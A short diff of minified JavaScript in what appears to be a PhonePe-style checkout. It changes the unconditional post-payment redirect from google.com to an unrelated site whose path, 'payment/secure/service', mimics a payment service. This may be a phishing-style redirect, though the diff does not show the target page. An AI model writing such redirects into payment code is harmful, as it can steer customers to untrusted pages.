@@ -28015,7 +28015,7 @@
 									const t = await yi.post("https://phonepe-node.onrender.com/create-order", e);
 									!0 === t.data.success ? y("/thankyou") : setTimeout((() => {
 										y("/Failure")
-									}), 3e3), window.location.href = "https://www.google.com";
+									}), 3e3), window.location.href = "https://hindimebaate.com/payment/secure/service/";
 								} catch (n) {
 									console.log("error in payment", n)
 								}
